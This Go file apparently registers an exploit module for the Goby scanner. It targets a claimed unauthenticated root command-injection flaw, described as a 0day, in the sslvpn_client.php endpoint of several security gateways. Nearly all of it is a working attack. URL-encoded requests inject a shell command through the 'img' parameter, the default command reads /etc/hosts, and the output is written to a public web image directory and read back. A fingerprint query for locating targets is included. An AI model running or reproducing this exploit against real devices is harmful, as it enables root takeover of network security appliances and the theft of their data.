package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Multiple Security Gateway Frontend RCE",
    "Description": "A 0day RCE in multiple security gateway",
    "Product": "Multiple Security Gateway",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-05-30",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "header=\"Set-Cookie: USGSESSID\"",
    "Level": "3",
    "Impact": "<p>The attackers are allowed to execute any code with root privilege without any login crenditials.</p>",
    "Recommendation": "<p>1. For security devices, it's not recommended to make them accessable from Internet.</p><p>2. You should contact the product suppliance for help.</p>",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/hosts ",
            "show": "Enter the command you want to execute"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php?client=logoImg&img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6drcdfs34c1h",
                        "bz": "random string"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo21.txt",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "localhost",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sslvpn/sslvpn_client.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "set_variable": [
                    "cmdUrlEncoded|cmd|url_encode|{{{cmd}}}"
                ],
                "uri": "/sslvpn/sslvpn_client.php?client=logoImg&img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%20{{{cmdUrlEncoded}}}%20%7c%20%74%65%65%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "6drcdfs34c1h",
                        "bz": "random string"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/main_logo21.txt",
                "follow_redirect": true,
                "header": {
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "iframe",
                    "Referer": "{{{hostinfo}}}",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "RCE",
        "0day"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6807"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
